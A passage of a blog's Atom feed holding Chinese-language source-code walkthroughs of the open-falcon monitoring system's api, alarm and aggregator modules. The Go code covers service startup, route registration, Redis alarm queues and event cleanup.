日志初始化</span></span><br><span class="line">err = config.InitLog(viper.GetString(<span class="string">"log_level"</span>))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//初始化数据</span></span><br><span class="line">err = config.InitDB(viper.GetBool(<span class="string">"db.db_bug"</span>), viper.GetViper())</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalf(<span class="string">"db conn failed with error %s"</span>, err.Error())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> viper.GetString(<span class="string">"log_level"</span>) != <span class="string">"debug"</span> &#123;</span><br><span class="line">gin.SetMode(gin.ReleaseMode)</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// gin初始化</span></span><br><span class="line">routes := gin.Default()</span><br><span class="line"><span class="keyword">if</span> viper.GetBool(<span class="string">"gen_doc"</span>) &#123;</span><br><span class="line">yaag.Init(&amp;yaag.Config&#123;</span><br><span class="line">On:       <span class="literal">true</span>,</span><br><span class="line">DocTitle: <span class="string">"Gin"</span>,</span><br><span class="line">DocPath:  viper.GetString(<span class="string">"gen_doc_path"</span>),</span><br><span class="line">BaseUrls: <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span>&#123;<span class="string">"Production"</span>: <span class="string">"/api/v1"</span>, <span class="string">"Staging"</span>: <span class="string">"/api/v1"</span>&#125;,</span><br><span class="line">&#125;)</span><br><span class="line">routes.Use(yaag_gin.Document())</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//启动graph服务，启动服务一致性hash</span></span><br><span class="line">initGraph()</span><br><span class="line"><span class="comment">//start gin server</span></span><br><span class="line">log.Debugf(<span class="string">"will start with port:%v"</span>, viper.GetString(<span class="string">"web_port"</span>))</span><br><span class="line"><span class="keyword">go</span> controller.StartGin(viper.GetString(<span class="string">"web_port"</span>), routes)</span><br><span class="line"></span><br><span class="line">sigs := <span class="built_in">make</span>(<span class="keyword">chan</span> os.Signal, <span class="number">1</span>)</span><br><span class="line">signal.Notify(sigs, syscall.SIGINT, syscall.SIGTERM)</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">&lt;-sigs</span><br><span class="line">fmt.Println()</span><br><span class="line">os.Exit(<span class="number">0</span>)</span><br><span class="line">&#125;()</span><br><span class="line"><span class="keyword">select</span> &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>initGraph函数中启动graph服务</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Start</span><span class="params">(addrs <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">clusterMap = addrs</span><br><span class="line">connTimeout = <span class="keyword">int32</span>(viper.GetInt(<span class="string">"graphs.conn_timeout"</span>))</span><br><span class="line">callTimeout = <span class="keyword">int32</span>(viper.GetInt(<span class="string">"graphs.call_timeout"</span>))</span><br><span class="line"><span class="keyword">for</span> c := <span class="keyword">range</span> clusterMap &#123;</span><br><span class="line">gcluster = <span class="built_in">append</span>(gcluster, c)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> r := <span class="built_in">recover</span>(); r != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Errorf(<span class="string">"graph got painc:%v"</span>, r)</span><br><span class="line">Start(clusterMap)</span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line">initNodeRings(clusterMap)  <span class="comment">//初始化一致性hash</span></span><br><span class="line">initConnPools(clusterMap)  <span class="comment">//初始化rpc连接池</span></span><br><span class="line">log.Println(<span class="string">"graph.Start ok"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>StartGin注册路由并启动：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">StartGin</span><span class="params">(port <span class="keyword">string</span>, r *gin.Engine)</span></span> &#123;</span><br><span class="line">r.Use(utils.CORS())</span><br><span class="line">r.GET(<span class="string">"/"</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">c.String(http.StatusOK, <span class="string">"Hello, I'm Falcon+ (｡A｡)"</span>)</span><br><span class="line">&#125;)</span><br><span class="line">graph.Routes(r)</span><br><span class="line">uic.Routes(r)</span><br><span class="line">template.Routes(r)</span><br><span class="line">strategy.Routes(r)</span><br><span class="line">host.Routes(r)</span><br><span class="line">expression.Routes(r)</span><br><span class="line">mockcfg.Routes(r)</span><br><span class="line">dashboard_graph.Routes(r)</span><br><span class="line">dashboard_screen.Routes(r)</span><br><span class="line">alarm.Routes(r)</span><br><span class="line">r.Run(port)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这边api主要是在gin中注册信息，提供增删改查的功能，具体可能需要仔细去看下了。详细的这边就不描述了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;open-falcon-api源码分析&quot;&gt;&lt;a href=&quot;#open-falcon-api源码分析&quot; class=&quot;headerlink&quot; title=&quot;open-falcon api源码分析&quot;&gt;&lt;/a&gt;open-falcon api源码分析&lt;/h2&gt;&lt;p&gt;主流
      
    
    </summary>
    
    
      <category term="monitor" scheme="http://www.mydreamdll.xyz/categories/monitor/"/>
    
    
      <category term="monitor" scheme="http://www.mydreamdll.xyz/tags/monitor/"/>
    
  </entry>
  
  <entry>
    <title>open-falcon alarm 源码分析</title>
    <link href="http://www.mydreamdll.xyz/2020/01/21/alarm%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <id>http://www.mydreamdll.xyz/2020/01/21/alarm%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</id>
    <published>2020-01-21T09:07:42.964Z</published>
    <updated>2020-01-21T09:04:29.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="open-falcon-alarm-源码分析"><a href="#open-falcon-alarm-源码分析" class="headerlink" title="open-falcon alarm 源码分析"></a>open-falcon alarm 源码分析</h2><p>主函数在modules/alarm/main中</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">g.BinaryName = BinaryName</span><br><span class="line">g.Version = Version</span><br><span class="line">g.GitCommit = GitCommit</span><br><span class="line"></span><br><span class="line">cfg := flag.String(<span class="string">"c"</span>, <span class="string">"cfg.json"</span>, <span class="string">"configuration file"</span>)</span><br><span class="line">version := flag.Bool(<span class="string">"v"</span>, <span class="literal">false</span>, <span class="string">"show version"</span>)</span><br><span class="line">help := flag.Bool(<span class="string">"h"</span>, <span class="literal">false</span>, <span class="string">"help"</span>)</span><br><span class="line">flag.Parse()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> *version &#123;</span><br><span class="line">fmt.Printf(<span class="string">"Open-Falcon %s version %s, build %s\n"</span>, BinaryName, Version, GitCommit)</span><br><span class="line">os.Exit(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> *help &#123;</span><br><span class="line">flag.Usage()</span><br><span class="line">os.Exit(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">g.ParseConfig(*cfg)</span><br><span class="line"></span><br><span class="line">g.InitLog(g.Config().LogLevel)</span><br><span class="line"><span class="keyword">if</span> g.Config().LogLevel != <span class="string">"debug"</span> &#123;</span><br><span class="line">gin.SetMode(gin.ReleaseMode)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//初始化redis连接池</span></span><br><span class="line">g.InitRedisConnPool()</span><br><span class="line">    <span class="comment">// 初始化数据库</span></span><br><span class="line">model.InitDatabase()</span><br><span class="line">    <span class="comment">// 启动定时发送channel</span></span><br><span class="line">cron.InitSenderWorker()</span><br><span class="line"><span class="comment">// 启动http服务</span></span><br><span class="line"><span class="keyword">go</span> http.Start()</span><br><span class="line">    <span class="comment">// 定时读取highevent</span></span><br><span class="line"><span class="keyword">go</span> cron.ReadHighEvent()</span><br><span class="line">    <span class="comment">// 定时读取lowevent</span></span><br><span class="line"><span class="keyword">go</span> cron.ReadLowEvent()</span><br><span class="line">    <span class="comment">// 组装Mail信息，群发功能</span></span><br><span class="line"><span class="keyword">go</span> cron.CombineSms()</span><br><span class="line"><span class="keyword">go</span> cron.CombineMail()</span><br><span class="line"><span class="keyword">go</span> cron.CombineIM()</span><br><span class="line">    <span class="comment">// 发送邮件功能</span></span><br><span class="line"><span class="keyword">go</span> cron.ConsumeIM()</span><br><span class="line"><span class="keyword">go</span> cron.ConsumeSms()</span><br><span class="line"><span class="keyword">go</span> cron.ConsumeMail()</span><br><span class="line">    <span class="comment">// 清理过期事件</span></span><br><span class="line"><span class="keyword">go</span> cron.CleanExpiredEvent()</span><br><span class="line"></span><br><span class="line">sigs := <span class="built_in">make</span>(<span class="keyword">chan</span> os.Signal, <span class="number">1</span>)</span><br><span class="line">signal.Notify(sigs, syscall.SIGINT, syscall.SIGTERM)</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">&lt;-sigs</span><br><span class="line">fmt.Println()</span><br><span class="line">g.RedisConnPool.Close()</span><br><span class="line">os.Exit(<span class="number">0</span>)</span><br><span class="line">&#125;()</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>事件读取任务以highevent为例子：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ReadHighEvent</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 获取优先级高的队列</span></span><br><span class="line">queues := g.Config().Redis.HighQueues</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(queues) == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">        <span class="comment">//  出队</span></span><br><span class="line">event, err := popEvent(queues)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">time.Sleep(time.Second)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">        <span class="comment">// 消费队列</span></span><br><span class="line">consume(event, <span class="literal">true</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">consume</span><span class="params">(event *cmodel.Event, isHigh <span class="keyword">bool</span>)</span></span> &#123;</span><br><span class="line">actionId := event.ActionId()</span><br><span class="line"><span class="keyword">if</span> actionId &lt;= <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">action := api.GetAction(actionId)</span><br><span class="line"><span class="keyword">if</span> action == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> action.Callback == <span class="number">1</span> &#123;</span><br><span class="line">HandleCallback(event, action)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> isHigh &#123;</span><br><span class="line">consumeHighEvents(event, action)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">consumeLowEvents(event, action)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>consumeHighEvents函数最终会调用WriteMaiModel函数最终写入到redis队列中去：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">WriteMailModel</span><span class="params">(mail *model.Mail)</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> mail == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bs, err := json.Marshal(mail)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Error(err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">log.Debugf(<span class="string">"write mail to queue, mail:%v, queue:%s"</span>, mail, MAIL_QUEUE_NAME)</span><br><span class="line">lpush(MAIL_QUEUE_NAME, <span class="keyword">string</span>(bs))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">combineMail</span><span class="params">()</span></span> &#123;</span><br><span class="line">dtos := popAllMailDto()</span><br><span class="line">count := <span class="built_in">len</span>(dtos)</span><br><span class="line"><span class="keyword">if</span> count == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dtoMap := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>][]*MailDto)</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; count; i++ &#123;</span><br><span class="line">key := fmt.Sprintf(<span class="string">"%d%s%s%s"</span>, dtos[i].Priority, dtos[i].Status, dtos[i].Email, dtos[i].Metric)</span><br><span class="line"><span class="keyword">if</span> _, ok := dtoMap[key]; ok &#123;</span><br><span class="line">dtoMap[key] = <span class="built_in">append</span>(dtoMap[key], dtos[i])</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">dtoMap[key] = []*MailDto&#123;dtos[i]&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不要在这处理，继续写回redis，否则重启alarm很容易丢数据</span></span><br><span class="line"><span class="keyword">for</span> _, arr := <span class="keyword">range</span> dtoMap &#123;</span><br><span class="line">size := <span class="built_in">len</span>(arr)</span><br><span class="line"><span class="keyword">if</span> size == <span class="number">1</span> &#123;</span><br><span class="line">redi.WriteMail([]<span class="keyword">string</span>&#123;arr[<span class="number">0</span>].Email&#125;, arr[<span class="number">0</span>].Subject, arr[<span class="number">0</span>].Content)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">subject := fmt.Sprintf(<span class="string">"[P%d][%s] %d %s"</span>, arr[<span class="number">0</span>].Priority, arr[<span class="number">0</span>].Status, size, arr[<span class="number">0</span>].Metric)</span><br><span class="line">contentArr := <span class="built_in">make</span>([]<span class="keyword">string</span>, size)</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; size; i++ &#123;</span><br><span class="line">contentArr[i] = arr[i].Content</span><br><span class="line">&#125;</span><br><span class="line">content := strings.Join(contentArr, <span class="string">"\r\n"</span>)</span><br><span class="line"></span><br><span class="line">log.Debugf(<span class="string">"combined mail subject:%s, content:%s"</span>, subject, content)</span><br><span class="line">redi.WriteMail([]<span class="keyword">string</span>&#123;arr[<span class="number">0</span>].Email&#125;, subject, content)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>设置以天为单位的过期删除事件，数据库中删除。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">CleanExpiredEvent</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line"></span><br><span class="line">retention_days := g.Config().Housekeeper.EventRetentionDays</span><br><span class="line">delete_batch := g.Config().Housekeeper.EventDeleteBatch</span><br><span class="line"></span><br><span class="line">now := time.Now()</span><br><span class="line">before := now.Add(time.Duration(-retention_days*<span class="number">24</span>) * time.Hour)</span><br><span class="line">eventmodel.DeleteEventOlder(before, delete_batch)</span><br><span class="line"></span><br><span class="line">time.Sleep(time.Second * <span class="number">60</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;open-falcon-alarm-源码分析&quot;&gt;&lt;a href=&quot;#open-falcon-alarm-源码分析&quot; class=&quot;headerlink&quot; title=&quot;open-falcon alarm 源码分析&quot;&gt;&lt;/a&gt;open-falcon alarm 源码
      
    
    </summary>
    
    
      <category term="monitor" scheme="http://www.mydreamdll.xyz/categories/monitor/"/>
    
    
      <category term="monitor" scheme="http://www.mydreamdll.xyz/tags/monitor/"/>
    
  </entry>
  
  <entry>
    <title>open-falcon aggregator源码分析</title>
    <link href="http://www.mydreamdll.xyz/2020/01/21/aggregator%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <id>http://www.mydreamdll.xyz/2020/01/21/aggregator%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</id>
    <published>2020-01-21T09:07:42.242Z</published>
    <updated>2020-01-21T09:03:58.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="open-falcon-aggregator源码分析"><a href="#open-falcon-aggregator源码分析" class="headerlink" title="open-falcon aggregator源码分析"></a>open-falcon aggregator源码分析</h2><p> 主流程module/aggregator/main中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">g.BinaryName = BinaryName</span><br><span class="line">g.Version = Version</span><br><span class="line">g.GitCommit = GitCommit</span><br><span class="line"></span><br><span class="line">cfg := flag.String(<span class="string">"c"</span>, <span class="string">"cfg.json"</span>, <span class="string">"configuration file"</span>)</span><br><span class="line">version := flag.Bool(<span class="string">"v"</span>, <span class="literal">false</span>, <span class="string">"show version"</span>)</span><br><span class="line">help := flag.Bool(<span class="string">"h"</span>, <span class="literal">false</span>, <span class="string">"help"</span>)</span><br><span class="line">flag.Parse()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> *version &#123;</span><br><span class="line">fmt.Printf(<span class="string">"Open-Falcon %s version %s, build %s\n"</span>, BinaryName, Version, GitCommit)</span><br><span class="line">os.Exit(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> *help &#123;</span><br><span class="line">flag.Usage()</span><br><span class="line">os.Exit(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 配置文件解析</span></span><br><span class="line">g.ParseConfig(*cfg)</span><br><span class="line">    <span class="comment">// 数据库初始化</span></span><br><span class="line">db.Init()</span><br><span class="line"><span class="comment">// http服务启动，接口查询所有的cluster信息</span></span><br><span class="line"><span class="keyword">go</span> http.Start()</span><br><span class="line">    <span class="comment">//定时更新cluster数据，并启动worker启动，用于计算平均指标数据</span></span><br><span class="line"><span class="keyword">go</span> cron.UpdateItems()</span><br><span class="line"></span><br><span class="line"><span class="comment">// sdk configuration</span></span><br><span class="line">sender.Debug = g.Config().Debug</span><br><span class="line">sender.PostPushUrl = g.Config().Api.PushApi</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 数据推送</span></span><br><span class="line">sender.StartSender()</span><br><span class="line"></span><br><span class="line">sigs := <span class="built_in">make</span>(<span class="keyword">chan</span> os.Signal, <span class="number">1</span>)</span><br><span class="line">signal.Notify(sigs, syscall.SIGINT, syscall.SIGTERM)</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">&lt;-sigs</span><br><span class="line">fmt.Println()</span><br><span class="line">os.Exit(<span class="number">0</span>)</span><br><span class="line">&#125;()</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要功能在UpdateItems函数中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">updateItems</span><span class="params">()</span></span> &#123;</span><br><span class="line">items, err := db.ReadClusterMonitorItems()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">deleteNoUseWorker(items)</span><br><span class="line">createWorkerIfNeed(items)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先查询数据库ReadClusterMonitorItems，获取已经在监控中的集群信息。，然后删除没有用到的集群信息。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">deleteNoUseWorker</span><span class="params">(m <span class="keyword">map</span>[<span class="keyword">string</span>]*g.Cluster)</span></span> &#123;</span><br><span class="line">del := []<span class="keyword">string</span>&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> key, worker := <span class="keyword">range</span> Workers &#123;</span><br><span class="line"><span class="keyword">if</span> _, ok := m[key]; !ok &#123;</span><br><span class="line">worker.Drop()</span><br><span class="line">del = <span class="built_in">append</span>(del, key)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, key := <span class="keyword">range</span> del &#123;</span><br><span class="line"><span class="built_in">delete</span>(Workers, key)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果还没有监控则创建worker任务：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">createWorkerIfNeed</span><span class="params">(m <span class="keyword">map</span>[<span class="keyword">string</span>]*g.Cluster)</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> key, item := <span class="keyword">range</span> m &#123;</span><br><span class="line"><span class="keyword">if</span> _, ok := Workers[key]; !ok &#123;</span><br><span class="line"><span class="keyword">if</span> item.Step &lt;= <span class="number">0</span> &#123;</span><br><span class="line">log.Println(<span class="string">"[W] invalid cluster(step &lt;= 0):"</span>, item)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">worker := NewWorker(item)</span><br><span class="line">Workers[key] = worker</span><br><span class="line">worker.Start() <span class="comment">// 启动</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(this Worker)</span> <span class="title">Start</span><span class="params">()</span></span> 